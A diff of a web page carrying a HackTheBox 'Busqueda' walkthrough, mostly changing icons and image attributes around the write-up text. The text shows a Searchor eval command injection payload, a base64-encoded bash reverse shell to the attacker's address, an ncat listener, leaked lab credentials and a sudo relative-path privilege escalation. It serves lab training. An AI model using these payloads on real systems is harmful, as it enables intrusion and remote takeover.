@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Busqueda - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/easy/busqueda/img/busqueda.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/easy/busqueda/img/busqueda.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Busqueda - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -155,22 +159,22 @@ Thanks to adding the domain to the /etc/hosts file, we are now redirected to the
 Upon analyzing the website, we can see that it utilizes Python, Werkzeug, and JQuery. It appears that the website is hosted in a Flask environment.<br/><br/>
 <h3><br/>Web Application</h3><br/>
 Once in the browser, we can access the web page with a graphical interface:<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/1.png"><br/><br/>
+<img width="1351" height="580" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/1.png"><br/><br/>
 Using the <a href="https://addons.mozilla.org/es/firefox/addon/wappalyzer/">Wappalyzer</a> extension, we can identify the technologies employed by this website:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/2.png"><br/><br/>
+<img width="558" height="584" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/2.png"><br/><br/>
 Scrolling down on the webpage, we can observe the presence of a field that allows us to input data. This field allows us to specify a search engine and the data we wish to search for:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/4.png"/><br/><br/>
+<img width="914" height="253" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/4.png"/><br/><br/>
 In the footer of the webpage, we can observe the technologies used by the web service, and one of them is <a href="https://github.com/ArjunSharda/Searchor/tree/v2.4.0">Searchor v2.4.0</a>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/5.png"/><br/><br/>
+<img width="773" height="206" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/5.png"/><br/><br/>
 If we search for vulnerabilities associated with this version of the Searchor package, we find that versions prior to 2.4.2 are susceptible to command injection.<br/><br/>
 Analyzing the source code of version <a href="https://github.com/ArjunSharda/Searchor/tree/v2.4.0">2.4.0</a>, we can see that in the file <a href="https://raw.githubusercontent.com/ArjunSharda/Searchor/v2.4.0/src/searchor/main.py">app.py</a>, the following lines of code are causing the vulnerability:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
+<img width="655" height="63" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
 The issue here lies in the use of the Python <code>eval</code> function, which allows for the interpretation of arbitrary Python expressions from input based on strings or compiled code.<br/><br/>
 <h3><br/>Shell as svc</h3><br/>
 At this point, I attempted to perform a search on the main page using the Google search engine, intercepting all requests with Burp Suite.<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/7.png"/><br/><br/>
+<img width="1351" height="621" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/7.png"/><br/><br/>
 If we examine the source code, we can observe that the "query" parameter corresponds to the variable referenced in the vulnerable line of code.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
+<img width="655" height="63" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/6.png"/><br/><br/>
 After conducting some tests, we were able to make the data we sent through the "query" parameter execute Python code that we specify. Below is the payload for testing remote command execution by sending an ICMP trace:<br/><br/>
 <div class="highlight"><pre><span></span>test'),__import__('os').system('ping -c 1 10.10.16.4')#
 </pre></div>
@@ -184,9 +188,9 @@ Before sending it, we need to listen using the tcpdump tool to capture ICMP trac
 </pre></div>
 
 We send the payload: <br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/8.png"/><br/><br/>
+<img width="1077" height="291" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/8.png"/><br/><br/>
 We have received the ping:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/10.png"/><br/><br/>
+<img width="996" height="163" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/10.png"/><br/><br/>
 The idea now is to send a reverse shell to obtain an interactive remote console with which to operate.<br/><br/>
 To avoid issues with single and double quotes, I will opt to use base64 encoding to encode, decode, and interpret the command that will send us the reverse shell. To do this, we will start by base64 encoding the typical Bash one-liner that will establish a reverse shell over port 443 using the TCP protocol:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1"'</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">w</span> <span class="mi">0</span><span class="p">;</span> <span class="n">echo</span>
@@ -207,7 +211,7 @@ Before sending the payload, we set up a listener on port 443 using the Ncat tool
 We send the following payload: <br/><br/>
 <div class="highlight"><pre><span></span>test'),__import__('os').system('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYxIg== | base64 -d | bash')#
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/11.png"/><br/><br/>
+<img width="930" height="257" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/11.png"/><br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">root@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="mi">443</span>
@@ -316,16 +320,16 @@ I will add this subdomain to my local machine's <code>/etc/hosts</code> file.<br
 </pre></div>
 <h4>Gitea Service</h4>
 Let's take a look at the web service hosted on the subdomain <code>gitea.searcher.htb</code>.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/14.png"/><br/><br/>
+<img width="1350" height="575" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/14.png"/><br/><br/>
 We navigate to the authentication section.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/15.png"/><br/><br/>
+<img width="1347" height="577" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/15.png"/><br/><br/>
 We can try using the credentials we obtained from the config file to authenticate:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">Username</span><span class="p">:</span> <span class="n">cody</span>
 <span class="n">Password</span><span class="p">:</span> <span class="n">jh1usoih2bkjaspwe92</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/18.png"/><br/><br/>
+<img width="877" height="259" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/18.png"/><br/><br/>
 We can verify that the credentials are correct and observe that there are repositories available:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/19.png"/><br/><br/>
+<img width="1350" height="579" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/19.png"/><br/><br/>
 These repositories are not useful to us since we already have access to them from the machine. However, it is interesting to note the existence of a user named <code>administrator</code>.<br/><br/>
 Unfortunately, we cannot view the content or modify the script as the directory it is located in belongs to the root user and does not allow reading of its files.<br/><br/>
 Next, we will execute the script exactly as shown using the <code>sudo -l</code> command, but adding <code>sudo</code> at the beginning of the command:<br/><br/>
@@ -426,13 +430,13 @@ It appears that this format returns certain container information in JSON format
 
 Instantly, my attention was drawn to a password that is leaked in the output again: <code>yuiu1hoiu4i5ho1uh</code>.<br/><br/>
 We can check if this password belongs to the <code>administrator</code> user of the Gitea service.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/20.png"/><br/><br/>
+<img width="879" height="257" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/20.png"/><br/><br/>
 The credentials are correct, and we can access as the <code>administrator</code> user.<br/><br/>
 We notice that the <code>administrator</code> user has a repository named <code>scripts</code>, which is interesting because it matches the name of the folder where the <code>system-checkup.py</code> script is stored.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/21.png"/><br/><br/>
+<img width="1351" height="535" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/21.png"/><br/><br/>
 We've gained access to the source code of the scripts stored in the directory and can see the source code of the script that we can execute as root.<br/><br/>
 Upon inspecting the code, we notice that in the <code>full-checkup</code> option, a Bash script is executed.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/23.png"/><br/><br/>
+<img width="353" height="182" loading="lazy" decoding="async" alt="" src="/writeups/htb/easy/busqueda/img/23.png"/><br/><br/>
 The issue with this is that it searches for the script in the current working directory, which allows us to take advantage of this situation to create our own script in a location where we have permission to write and execute it as root.<br/><br/>
 Let's navigate to the <code>/dev/shm</code> directory:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
